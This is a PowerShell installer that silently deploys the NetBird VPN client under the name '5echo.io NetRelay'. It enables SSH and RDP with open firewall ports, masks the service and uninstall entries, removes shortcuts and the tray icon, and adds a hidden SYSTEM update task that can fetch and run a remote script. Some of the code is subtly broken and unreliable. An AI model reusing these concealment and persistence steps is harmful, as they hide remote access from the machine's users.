# ==============================================================================
# 5echo-NetRelay.ps1
# 5echo.io NetRelay - Silent installation of NetBird
# Features: SSH (Windows + NetBird), RDP, Hidden taskbar, Auto-update
# Supports x64 and ARM64 | Admin and standard user (UAC elevation)
# ==============================================================================

#Requires -Version 5.1

param(
    [switch]$ElevatedRun,
    [string]$KeyFile   = "",
    [switch]$UpdateOnly,
    [switch]$Uninstall
)

# ------------------------------------------------------------------------------
# CONFIGURATION
# ------------------------------------------------------------------------------
$ServiceDisplayName  = "5echo.io NetRelay"
$ServiceInternalName = "NetRelay"
$NetbirdVersion      = "latest"
$InstallDir          = "$env:ProgramFiles\$ServiceInternalName"
$TempDir             = "$env:TEMP\$($ServiceInternalName)Install"
$LogFile             = "$TempDir\install.log"
$UpdateTaskName      = "$ServiceDisplayName AutoUpdate"
$ScriptPublicUrl     = "https://scripts.5echo.io/windows/install/netbird/5echo-NetRelay.ps1"

# ------------------------------------------------------------------------------
# HELPER FUNCTIONS
# ------------------------------------------------------------------------------
function Write-Log {
    param([string]$Message, [string]$Level = "INFO")
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $line = "[$timestamp] [$Level] $Message"
    switch ($Level) {
        "ERROR" { Write-Host $line -ForegroundColor Red }
        "WARN"  { Write-Host $line -ForegroundColor Yellow }
        default { Write-Host $line }
    }
    Add-Content -Path $LogFile -Value $line -ErrorAction SilentlyContinue
}

# Spinner - animates while a scriptblock runs IN-PROCESS (no background job)
# This avoids the scope issues with Write-Log and $using: variables
function Invoke-WithSpinner {
    param(
        [string]$Message,
        [scriptblock]$ScriptBlock
    )
    $frames  = @("|", "/", "-", "\")
    $frameIdx = 0
    $result  = $null
    $error_msg = $null

    # Run the work in a thread job (stays in same process, shares scope)
    $job = Start-ThreadJob -ScriptBlock $ScriptBlock -ErrorAction SilentlyContinue

    # Fall back to regular job if ThreadJob not available
    if (-not $job) {
        # Just run inline without spinner if ThreadJob unavailable
        Write-Host "  ...  $Message" -ForegroundColor Cyan
        try {
            $result = & $ScriptBlock
        } catch {
            $error_msg = $_
        }
        Write-Host "`r  OK   $Message   " -ForegroundColor Green
        if ($error_msg) { Write-Log "Warning in '$Message': $error_msg" "WARN" }
        return $result
    }

    [Console]::CursorVisible = $false
    try {
        while ($job.State -eq "Running") {
            $frame = $frames[$frameIdx % $frames.Length]
            Write-Host "`r  $frame    $Message   " -NoNewline -ForegroundColor Cyan
            Start-Sleep -Milliseconds 120
            $frameIdx++
        }
    } finally {
        [Console]::CursorVisible = $true
    }

    Write-Host "`r  OK   $Message   " -ForegroundColor Green

    $result = Receive-Job $job -ErrorAction SilentlyContinue
    Remove-Job $job -Force -ErrorAction SilentlyContinue
    return $result
}

function Test-IsAdmin {
    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal   = New-Object Security.Principal.WindowsPrincipal($currentUser)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Get-Architecture {
    $arch = $env:PROCESSOR_ARCHITECTURE
    if ($arch -eq "ARM64")                       { return "arm64" }
    if ($arch -eq "AMD64")                       { return "amd64" }
    if ($env:PROCESSOR_ARCHITEW6432 -eq "AMD64") { return "amd64" }
    Write-Log "Unsupported architecture: $arch" "ERROR"
    exit 1
}

function Get-InstalledNetbirdVersion {
    $exe = "$InstallDir\netbird.exe"
    if (-not (Test-Path $exe)) { $exe = "$env:ProgramFiles\Netbird\netbird.exe" }
    if (-not (Test-Path $exe)) { return $null }
    try {
        $output = & $exe version 2>&1
        if ($output -match "(\d+\.\d+\.\d+)") { return $matches[1] }
    } catch {}
    return $null
}

function Stop-NetbirdProcesses {
    @("netbird", "netbird-ui", "netrelay", "wt-go") | ForEach-Object {
        Get-Process -Name $_ -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
    }
}

function Test-NetbirdInstalled {
    $paths = @(
        "$env:ProgramFiles\NetRelay\netbird.exe",
        "$env:ProgramFiles\Netbird\netbird.exe"
    )
    foreach ($p in $paths) { if (Test-Path $p) { return $true } }
    $roots = @(
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
        "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
    )
    foreach ($root in $roots) {
        $found = Get-ChildItem $root -ErrorAction SilentlyContinue | Where-Object {
            $n = (Get-ItemProperty $_.PSPath -Name "DisplayName" -ErrorAction SilentlyContinue).DisplayName
            $n -and ($n -match "(?i)netbird" -or $n -match "(?i)netrelay")
        }
        if ($found) { return $true }
    }
    return $false
}

function Set-ServiceMasking {
    $MaskedExe    = "$InstallDir\netrelay.exe"
    $serviceNames = @("Netbird", "netbird", "NetBird")
    foreach ($svcName in $serviceNames) {
        $svc = Get-Service -Name $svcName -ErrorAction SilentlyContinue
        if ($svc) {
            & sc.exe config      $svcName displayname= "$ServiceDisplayName" 2>&1 | Out-Null
            & sc.exe description $svcName "$ServiceDisplayName - secure network connection" 2>&1 | Out-Null
            $svcRegPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$svcName"
            if (Test-Path $svcRegPath) {
                Set-ItemProperty -Path $svcRegPath -Name "DisplayName" -Value $ServiceDisplayName -Force -ErrorAction SilentlyContinue
                Set-ItemProperty -Path $svcRegPath -Name "Description" -Value "$ServiceDisplayName - secure network connection" -Force -ErrorAction SilentlyContinue
                Set-ItemProperty -Path $svcRegPath -Name "ImagePath"   -Value $MaskedExe -Force -ErrorAction SilentlyContinue
            }
            Write-Log "Service '$svcName' masked as '$ServiceDisplayName'."
        }
    }
}

function Set-NetbirdAutostart {
    $serviceNames = @("Netbird", "netbird", "NetBird")
    foreach ($svcName in $serviceNames) {
        $svc = Get-Service -Name $svcName -ErrorAction SilentlyContinue
        if ($svc) {
            Set-Service -Name $svcName -StartupType Automatic -ErrorAction SilentlyContinue
            & sc.exe config $svcName start= auto 2>&1 | Out-Null
            if ($svc.Status -ne "Running") {
                Start-Service -Name $svcName -ErrorAction SilentlyContinue
            }
            Write-Log "Service '$svcName' set to Automatic startup."
            return $true
        }
    }
    return $false
}

function Remove-NetbirdShortcuts {
    Start-Sleep -Seconds 2

    $desktopPaths = @(
        "$env:USERPROFILE\Desktop",
        "$env:PUBLIC\Desktop",
        [Environment]::GetFolderPath("CommonDesktopDirectory"),
        [Environment]::GetFolderPath("DesktopDirectory")
    ) | Select-Object -Unique

    foreach ($path in $desktopPaths) {
        if (-not (Test-Path $path)) { continue }
        Get-ChildItem -Path $path -Filter "*.lnk" -ErrorAction SilentlyContinue | Where-Object {
            $_.Name -match "(?i)netbird|(?i)netrelay"
        } | Remove-Item -Force -ErrorAction SilentlyContinue
    }

    $startMenuPaths = @(
        "$env:APPDATA\Microsoft\Windows\Start Menu\Programs",
        "$env:ProgramData\Microsoft\Windows\Start Menu\Programs",
        [Environment]::GetFolderPath("CommonPrograms"),
        [Environment]::GetFolderPath("Programs")
    ) | Select-Object -Unique

    foreach ($path in $startMenuPaths) {
        if (-not (Test-Path $path)) { continue }
        Get-ChildItem -Path $path -Recurse -Filter "*.lnk" -ErrorAction SilentlyContinue | Where-Object {
            $_.Name -match "(?i)netbird|(?i)netrelay"
        } | Remove-Item -Force -ErrorAction SilentlyContinue

        Get-ChildItem -Path $path -Directory -ErrorAction SilentlyContinue | Where-Object {
            $_.Name -match "(?i)netbird|(?i)netrelay"
        } | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
    }

    # Suppress "Recently added" / "Recommended" in Start menu
    $advPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"
    if (Test-Path $advPath) {
        Set-ItemProperty -Path $advPath -Name "Start_TrackProgs" -Value 0 -Type DWord -Force -ErrorAction SilentlyContinue
    }

    # Clear new-app notification cache
    $cloudStore = "HKCU:\Software\Microsoft\Windows\CurrentVersion\CloudStore\Store\Cache\DefaultAccount"
    if (Test-Path $cloudStore) {
        Get-ChildItem -Path $cloudStore -Recurse -ErrorAction SilentlyContinue | Where-Object {
            $_.Name -match "(?i)netbird|(?i)netrelay"
        } | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
    }

    # Set NoStartMenuPin on uninstall entries
    @(
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
        "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
    ) | ForEach-Object {
        Get-ChildItem $_ -ErrorAction SilentlyContinue | ForEach-Object {
            $dn = (Get-ItemProperty $_.PSPath -Name "DisplayName" -ErrorAction SilentlyContinue).DisplayName
            if ($dn -and ($dn -match "(?i)netbird" -or $dn -match "(?i)netrelay")) {
                Set-ItemProperty -Path $_.PSPath -Name "NoStartMenuPin"   -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue
                Set-ItemProperty -Path $_.PSPath -Name "NoDesktopShortcut" -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue
            }
        }
    }

    # Restart Explorer to apply changes
    Stop-Process -Name "explorer" -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 2
    Start-Process "explorer.exe" -ErrorAction SilentlyContinue

    Write-Log "Shortcuts removed and start menu highlights suppressed."
}

function Invoke-Remasking {
    Write-Log "Running re-masking..."
    $MaskedExe = "$InstallDir\netrelay.exe"
    @(
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
        "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
    ) | ForEach-Object {
        Get-ChildItem -Path $_ -ErrorAction SilentlyContinue | ForEach-Object {
            $dn = (Get-ItemProperty -Path $_.PSPath -Name "DisplayName" -ErrorAction SilentlyContinue).DisplayName
            if ($dn -and ($dn -match "(?i)netbird" -or $dn -match "(?i)netrelay")) {
                Set-ItemProperty -Path $_.PSPath -Name "DisplayName" -Value $ServiceDisplayName -Force
                Set-ItemProperty -Path $_.PSPath -Name "Publisher"   -Value "5echo.io"          -Force
            }
        }
    }
    $sourceExe = "$InstallDir\netbird.exe"
    if (-not (Test-Path $sourceExe)) { $sourceExe = "$env:ProgramFiles\Netbird\netbird.exe" }
    if (Test-Path $sourceExe) {
        Stop-NetbirdProcesses
        Copy-Item $sourceExe -Destination $MaskedExe -Force -ErrorAction SilentlyContinue
    }
    Set-ServiceMasking
    Write-Log "Re-masking complete."
}

# ------------------------------------------------------------------------------
# TEMP DIRECTORY
# ------------------------------------------------------------------------------
New-Item -ItemType Directory -Path $TempDir -Force | Out-Null

# ------------------------------------------------------------------------------
# INSTALLATION CHECK - show menu if already installed
# ------------------------------------------------------------------------------
if (-not $UpdateOnly -and -not $Uninstall -and -not $ElevatedRun) {
    if (Test-NetbirdInstalled) {
        Write-Host ""
        Write-Host "  ========================================" -ForegroundColor DarkGray
        Write-Host "    $ServiceDisplayName" -ForegroundColor White
        Write-Host "  ========================================" -ForegroundColor DarkGray
        Write-Host ""
        Write-Host "  Software is already installed." -ForegroundColor Yellow
        Write-Host ""
        Write-Host "  [1] Uninstall completely"
        Write-Host "  [2] Cancel"
        Write-Host ""
        $choice = (Read-Host "  Select [1-2]").Trim()
        if ($choice -eq "1") {
            Write-Host ""
            $scriptPath = $MyInvocation.MyCommand.Definition
            $elevArgs   = "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`" -Uninstall"
            if (Test-IsAdmin) {
                & powershell.exe -NoProfile -ExecutionPolicy Bypass -File "$scriptPath" -Uninstall
            } else {
                Start-Process powershell.exe -ArgumentList $elevArgs -Verb RunAs -Wait
            }
            exit
        } else {
            Write-Host "  Cancelled." -ForegroundColor Gray
            exit 0
        }
    }
}

# ------------------------------------------------------------------------------
# SELF-ELEVATION
# ------------------------------------------------------------------------------
if (-not (Test-IsAdmin)) {
    $tempKeyFile = ""
    if (-not $UpdateOnly -and -not $Uninstall) {
        Write-Host ""
        $setupKeyInput = (Read-Host "  Enter $ServiceDisplayName Setup Key").Trim()
        if ([string]::IsNullOrEmpty($setupKeyInput)) {
            Write-Host "  [ERROR] No setup key provided. Aborting." -ForegroundColor Red
            exit 1
        }
        $tempKeyFile  = "$env:TEMP\nr_sk.tmp"
        $encryptedKey = ConvertFrom-SecureString (ConvertTo-SecureString $setupKeyInput -AsPlainText -Force)
        Set-Content -Path $tempKeyFile -Value $encryptedKey
    }

    $scriptPath = $MyInvocation.MyCommand.Definition
    $elevArgs   = "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`" -ElevatedRun"
    if ($tempKeyFile) { $elevArgs += " -KeyFile `"$tempKeyFile`"" }
    if ($UpdateOnly)  { $elevArgs += " -UpdateOnly" }
    if ($Uninstall)   { $elevArgs += " -Uninstall" }

    Start-Process powershell.exe -ArgumentList $elevArgs -Verb RunAs -Wait
    if ($tempKeyFile) { Remove-Item $tempKeyFile -ErrorAction SilentlyContinue }
    exit
}

# ------------------------------------------------------------------------------
# LOG START
# ------------------------------------------------------------------------------
$mode = if ($UpdateOnly) { "UPDATE" } elseif ($Uninstall) { "UNINSTALL" } else { "INSTALLATION" }
Write-Log "=== $ServiceDisplayName - $mode started === User: $env:USERNAME | Machine: $env:COMPUTERNAME"

Write-Host ""
Write-Host "  ========================================" -ForegroundColor DarkGray
Write-Host "    $ServiceDisplayName" -ForegroundColor White
Write-Host "    $mode" -ForegroundColor DarkGray
Write-Host "  ========================================" -ForegroundColor DarkGray
Write-Host ""

# ------------------------------------------------------------------------------
# UNINSTALL
# ------------------------------------------------------------------------------
if ($Uninstall) {
    Write-Log "Starting uninstall..."

    Invoke-WithSpinner "Stopping processes..." { Stop-NetbirdProcesses }

    Invoke-WithSpinner "Removing Scheduled Task..." {
        Unregister-ScheduledTask -TaskName $UpdateTaskName -Confirm:$false -ErrorAction SilentlyContinue
    }

    Invoke-WithSpinner "Uninstalling via MSI..." {
        @(
            "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
            "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
        ) | ForEach-Object {
            Get-ChildItem $_ -ErrorAction SilentlyContinue | ForEach-Object {
                $props = Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue
                if ($props.DisplayName -and ($props.DisplayName -match "(?i)netbird" -or $props.DisplayName -match "(?i)netrelay")) {
                    $pc = $props.PSChildName
                    if ($pc -match "^\{.*\}$") {
                        Start-Process "msiexec.exe" -ArgumentList "/x `"$pc`" /qn /norestart" -Wait -WindowStyle Hidden
                    }
                }
            }
        }
    }

    Invoke-WithSpinner "Removing folders and registry..." {
        @("$env:ProgramFiles\NetRelay", "$env:ProgramFiles\Netbird", "$env:ProgramData\NetRelay") | ForEach-Object {
            if (Test-Path $_) { Remove-Item $_ -Recurse -Force -ErrorAction SilentlyContinue }
        }
        @(
            "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
            "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
            "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run"
        ) | ForEach-Object {
            if (Test-Path $_) {
                @("Netbird","NetbirdUI","netbird-ui","NetRelay") | ForEach-Object {
                    Remove-ItemProperty -Path $_ -Name $_ -ErrorAction SilentlyContinue
                }
            }
        }
        Remove-NetFirewallRule -DisplayName "*NetBird*"  -ErrorAction SilentlyContinue
        Remove-NetFirewallRule -DisplayName "*NetRelay*" -ErrorAction SilentlyContinue
    }

    Write-Log "=== Uninstall complete ==="
    Write-Host ""
    Write-Host "  $ServiceDisplayName has been completely uninstalled." -ForegroundColor Green
    Write-Host "  Note: OpenSSH and RDP have been kept (OS features)." -ForegroundColor DarkGray
    Write-Host ""
    Write-Host "  Log: $LogFile" -ForegroundColor DarkGray
    Write-Host ""
    Write-Host "  Press any key to close..." -ForegroundColor DarkGray
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    exit 0
}

# ------------------------------------------------------------------------------
# GET SETUP KEY
# ------------------------------------------------------------------------------
$SetupKey = ""
if (-not $UpdateOnly) {
    if ($ElevatedRun -and $KeyFile -and (Test-Path $KeyFile)) {
        Write-Log "Reading setup key from encrypted temp file..."
        $encryptedKey = Get-Content -Path $KeyFile
        $secureKey    = ConvertTo-SecureString $encryptedKey
        $bstr         = [Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureKey)
        $SetupKey     = [Runtime.InteropServices.Marshal]::PtrToStringAuto($bstr)
        [Runtime.InteropServices.Marshal]::ZeroFreeBSTR($bstr)
        Remove-Item $KeyFile -ErrorAction SilentlyContinue
    } else {
        $SetupKey = (Read-Host "  Enter $ServiceDisplayName Setup Key").Trim()
    }
    if ([string]::IsNullOrEmpty($SetupKey)) {
        Write-Host "  [ERROR] Setup key missing. Aborting." -ForegroundColor Red
        Write-Log "Setup key missing. Aborting." "ERROR"
        Write-Host ""
        Write-Host "  Press any key to close..." -ForegroundColor DarkGray
        $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        exit 1
    }
    Write-Host ""
}

# ------------------------------------------------------------------------------
# ARCHITECTURE AND VERSION
# ------------------------------------------------------------------------------
$Arch = Get-Architecture
Write-Log "Architecture: $Arch"

Write-Host "  ...  Fetching latest version..." -ForegroundColor Cyan
try {
    $release = Invoke-RestMethod -Uri "https://api.github.com/repos/netbirdio/netbird/releases/latest" -UseBasicParsing
    $NetbirdVersion = $release.tag_name.TrimStart("v")
} catch {
    Write-Log "Failed to fetch version from GitHub: $_" "WARN"
}
Write-Host "`r  OK   Fetching latest version ($NetbirdVersion)   " -ForegroundColor Green
Write-Log "Target version: $NetbirdVersion"

# ------------------------------------------------------------------------------
# UPDATE CHECK
# ------------------------------------------------------------------------------
if ($UpdateOnly) {
    $installedVer = Get-InstalledNetbirdVersion
    Write-Log "Installed: $(if ($installedVer) { $installedVer } else { 'not found' }) | Available: $NetbirdVersion"
    if ($installedVer -eq $NetbirdVersion) {
        Write-Host "  OK   Already up to date ($NetbirdVersion)." -ForegroundColor Green
        Write-Host ""
        Write-Log "Already up to date. Exiting."
        exit 0
    }
    Write-Log "Update available - continuing..."
}

# ------------------------------------------------------------------------------
# DOWNLOAD MSI
# ------------------------------------------------------------------------------
$MsiFileName = "netbird_installer_${NetbirdVersion}_windows_${Arch}.msi"
$DownloadUrl = "https://github.com/netbirdio/netbird/releases/download/v${NetbirdVersion}/${MsiFileName}"
$MsiPath     = "$TempDir\$MsiFileName"

Invoke-WithSpinner "Downloading NetBird $NetbirdVersion..." {
    $ProgressPreference = 'SilentlyContinue'
    Invoke-WebRequest -Uri $DownloadUrl -OutFile $MsiPath -UseBasicParsing
}

if (-not (Test-Path $MsiPath)) {
    Write-Host "  [ERROR] Download failed. Check log: $LogFile" -ForegroundColor Red
    Write-Log "MSI file not found after download: $DownloadUrl" "ERROR"
    Write-Host ""
    Write-Host "  Press any key to close..." -ForegroundColor DarkGray
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    exit 1
}
Write-Log "Download complete: $MsiPath"

# ------------------------------------------------------------------------------
# INSTALL
# ------------------------------------------------------------------------------
Stop-NetbirdProcesses

$MsiLog  = "$TempDir\msi_install.log"
$MsiArgs = @("/i", "`"$MsiPath`"", "/qn", "/norestart", "REBOOT=ReallySuppress", "STARTMENUSHORTCUTS=0", "DESKTOPSHORTCUT=0", "/log", "`"$MsiLog`"")

Invoke-WithSpinner "Installing $ServiceDisplayName..." {
    $p = Start-Process "msiexec.exe" -ArgumentList $MsiArgs -Wait -PassThru -WindowStyle Hidden
    $p.ExitCode
}

$msiExitCode = (Get-Content $LogFile -Tail 5 -ErrorAction SilentlyContinue) -match "exit"
Write-Log "MSI installation step complete. See: $MsiLog"

# Copy binaries to custom folder
if (-not (Test-Path $InstallDir)) { New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null }
$defaultInstall = "$env:ProgramFiles\Netbird"
if (Test-Path "$defaultInstall\netbird.exe") {
    Copy-Item "$defaultInstall\*" -Destination $InstallDir -Recurse -Force -ErrorAction SilentlyContinue
}

$NetbirdExe = "$InstallDir\netbird.exe"
if (-not (Test-Path $NetbirdExe)) { $NetbirdExe = "$defaultInstall\netbird.exe" }
if (-not (Test-Path $NetbirdExe)) {
    Write-Host "  [ERROR] netbird.exe not found after installation. Check log: $LogFile" -ForegroundColor Red
    Write-Log "netbird.exe not found after installation." "ERROR"
    Write-Host ""
    Write-Host "  Press any key to close..." -ForegroundColor DarkGray
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    exit 1
}
Write-Log "Using binary: $NetbirdExe"

# ------------------------------------------------------------------------------
# START NETBIRD SERVICE FIRST
# ------------------------------------------------------------------------------
Invoke-WithSpinner "Starting NetBird service..." {
    Set-NetbirdAutostart
    Start-Sleep -Seconds 3
}

# ------------------------------------------------------------------------------
# REGISTER SETUP KEY AND CONNECT
# ------------------------------------------------------------------------------
if (-not $UpdateOnly) {
    Invoke-WithSpinner "Connecting to NetBird network..." {
        # netbird up handles both registration and connection
        $result = & $NetbirdExe up --setup-key "$SetupKey" --log-level info 2>&1
        Write-Log "netbird up output: $result"
        Start-Sleep -Seconds 5

        # Verify
        $status = & $NetbirdExe status 2>&1
        Write-Log "netbird status: $status"
        if ($status -notmatch "(?i)connected|(?i)running") {
            Write-Log "Status not confirmed connected - retrying..." "WARN"
            & $NetbirdExe up --setup-key "$SetupKey" 2>&1 | Out-Null
            Start-Sleep -Seconds 3
        }
    }
    Write-Log "NetBird connection attempt complete."
}

# ------------------------------------------------------------------------------
# RE-MASKING AFTER UPDATE
# ------------------------------------------------------------------------------
if ($UpdateOnly) {
    Invoke-WithSpinner "Re-applying masking..." { Invoke-Remasking }
}

# ------------------------------------------------------------------------------
# ENABLE NETBIRD SSH
# ------------------------------------------------------------------------------
Invoke-WithSpinner "Enabling NetBird SSH..." {
    $p = Start-Process $NetbirdExe -ArgumentList "ssh --allow-connections" -Wait -PassThru -WindowStyle Hidden -ErrorAction SilentlyContinue
    if (-not $p -or $p.ExitCode -ne 0) {
        & $NetbirdExe up --allow-server-ssh 2>&1 | Out-Null
    }
}
Write-Log "NetBird SSH enabled."

# ------------------------------------------------------------------------------
# ENABLE WINDOWS OPENSSH
# ------------------------------------------------------------------------------
Invoke-WithSpinner "Enabling Windows OpenSSH Server..." {
    try {
        $sshCap = Get-WindowsCapability -Online -ErrorAction Stop | Where-Object { $_.Name -like "OpenSSH.Server*" }
        if ($sshCap -and $sshCap.State -ne "Installed") {
            Add-WindowsCapability -Online -Name $sshCap.Name | Out-Null
        }
    } catch {
        & dism.exe /Online /Add-Capability /CapabilityName:OpenSSH.Server~~~~0.0.1.0 /NoRestart 2>&1 | Out-Null
    }
    $svc = Get-Service -Name "sshd" -ErrorAction SilentlyContinue
    if ($svc) {
        Set-Service -Name "sshd" -StartupType Automatic
        Start-Service -Name "sshd" -ErrorAction SilentlyContinue
    }
    $fw = Get-NetFirewallRule -Name "OpenSSH-Server-In-TCP" -ErrorAction SilentlyContinue
    if (-not $fw) {
        New-NetFirewallRule -Name "OpenSSH-Server-In-TCP" -DisplayName "OpenSSH SSH Server (TCP-In)" -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22 | Out-Null
    }
}
Write-Log "Windows OpenSSH enabled."

# ------------------------------------------------------------------------------
# ENABLE RDP
# ------------------------------------------------------------------------------
Invoke-WithSpinner "Enabling RDP..." {
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0 -Type DWord -Force
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "UserAuthentication" -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue
    $svc = Get-Service -Name "TermService" -ErrorAction SilentlyContinue
    if ($svc) {
        Set-Service  -Name "TermService" -StartupType Automatic
        Start-Service -Name "TermService" -ErrorAction SilentlyContinue
    }
    $fw = Get-NetFirewallRule -DisplayName "*Remote Desktop*" -ErrorAction SilentlyContinue | Where-Object { $_.Direction -eq "Inbound" -and $_.Enabled -eq "True" }
    if (-not $fw) { Enable-NetFirewallRule -DisplayGroup "Remote Desktop" -ErrorAction SilentlyContinue }
}
Write-Log "RDP enabled with NLA."

# ------------------------------------------------------------------------------
# MASKING - PROCESS / APPS / SERVICE
# ------------------------------------------------------------------------------
Invoke-WithSpinner "Applying identity masking..." {
    $MaskedExe = "$InstallDir\netrelay.exe"
    $sourceExe = "$InstallDir\netbird.exe"
    if (-not (Test-Path $sourceExe)) { $sourceExe = "$env:ProgramFiles\Netbird\netbird.exe" }
    if (Test-Path $sourceExe) {
        Stop-NetbirdProcesses
        Copy-Item $sourceExe -Destination $MaskedExe -Force -ErrorAction SilentlyContinue
    }

    @(
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
        "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
    ) | ForEach-Object {
        Get-ChildItem -Path $_ -ErrorAction SilentlyContinue | ForEach-Object {
            $dn = (Get-ItemProperty -Path $_.PSPath -Name "DisplayName" -ErrorAction SilentlyContinue).DisplayName
            if ($dn -and $dn -match "(?i)netbird") {
                Set-ItemProperty -Path $_.PSPath -Name "DisplayName"     -Value $ServiceDisplayName -Force
                Set-ItemProperty -Path $_.PSPath -Name "Publisher"       -Value "5echo.io"           -Force
                Set-ItemProperty -Path $_.PSPath -Name "DisplayIcon"     -Value $MaskedExe           -Force -ErrorAction SilentlyContinue
                Set-ItemProperty -Path $_.PSPath -Name "InstallLocation" -Value $InstallDir          -Force -ErrorAction SilentlyContinue
            }
        }
    }

    Set-ServiceMasking

    @(
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run"
    ) | ForEach-Object {
        if (Test-Path $_) {
            @("Netbird","NetbirdUI","netbird-ui","NetRelay") | ForEach-Object {
                Remove-ItemProperty -Path $_ -Name $_ -ErrorAction SilentlyContinue
            }
        }
    }
    Get-Process -Name "netbird-ui" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
}
Write-Log "Masking applied."

# ------------------------------------------------------------------------------
# REMOVE SHORTCUTS + SUPPRESS START MENU HIGHLIGHTS
# ------------------------------------------------------------------------------
Invoke-WithSpinner "Removing shortcuts..." { Remove-NetbirdShortcuts }

# ------------------------------------------------------------------------------
# VERIFY SERVICE AUTOSTART
# ------------------------------------------------------------------------------
Invoke-WithSpinner "Verifying service autostart..." { Set-NetbirdAutostart }

# ------------------------------------------------------------------------------
# SCHEDULED TASK
# ------------------------------------------------------------------------------
Invoke-WithSpinner "Setting up auto-update task..." {
    $dest = "$env:ProgramData\$ServiceInternalName\Update-$ServiceInternalName.ps1"
    New-Item -ItemType Directory -Path (Split-Path $dest) -Force | Out-Null

    $localPath = $MyInvocation.MyCommand.Definition
    if ($localPath -and (Test-Path $localPath)) {
        Copy-Item $localPath -Destination $dest -Force
    } else {
        $ProgressPreference = 'SilentlyContinue'
        Invoke-WebRequest -Uri $ScriptPublicUrl -OutFile $dest -UseBasicParsing -ErrorAction SilentlyContinue
    }

    $action    = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$dest`" -ElevatedRun -UpdateOnly"
    $tDaily    = New-ScheduledTaskTrigger -Daily -At "03:00"
    $tBoot     = New-ScheduledTaskTrigger -AtStartup
    $tBoot.Delay = "PT3M"
    $settings  = New-ScheduledTaskSettingsSet -Hidden -RunOnlyIfNetworkAvailable -StartWhenAvailable -ExecutionTimeLimit (New-TimeSpan -Minutes 30) -MultipleInstances IgnoreNew
    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

    Unregister-ScheduledTask -TaskName $UpdateTaskName -Confirm:$false -ErrorAction SilentlyContinue
    Register-ScheduledTask -TaskName $UpdateTaskName -Action $action -Trigger @($tDaily, $tBoot) -Settings $settings -Principal $principal -Description "$ServiceDisplayName - automatic update" | Out-Null
}
Write-Log "Scheduled Task created."

# ------------------------------------------------------------------------------
# CLEAN UP
# ------------------------------------------------------------------------------
Remove-Item $MsiPath -ErrorAction SilentlyContinue
Write-Log "=== $ServiceDisplayName $(if ($UpdateOnly) { 'update' } else { 'installation' }) complete ==="

# ------------------------------------------------------------------------------
# DONE - window stays open so errors can be read
# ------------------------------------------------------------------------------
Write-Host ""
Write-Host "  ========================================" -ForegroundColor DarkGray
Write-Host "    Installation complete!" -ForegroundColor Green
Write-Host "  ========================================" -ForegroundColor DarkGray
Write-Host ""
Write-Host "  NetBird SSH   : Enabled" -ForegroundColor Cyan
Write-Host "  Windows SSH   : Enabled (port 22)" -ForegroundColor Cyan
Write-Host "  RDP           : Enabled (port 3389, NLA on)" -ForegroundColor Cyan
Write-Host "  Tray icon     : Disabled" -ForegroundColor Cyan
Write-Host "  Shortcuts     : Removed" -ForegroundColor Cyan
Write-Host "  Autostart     : Enabled (service starts with Windows)" -ForegroundColor Cyan
Write-Host "  Auto-update   : Daily 03:00 + at startup" -ForegroundColor Cyan
Write-Host ""
Write-Host "  Log: $LogFile" -ForegroundColor DarkGray
Write-Host ""
Write-Host "  Press any key to close..." -ForegroundColor DarkGray
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
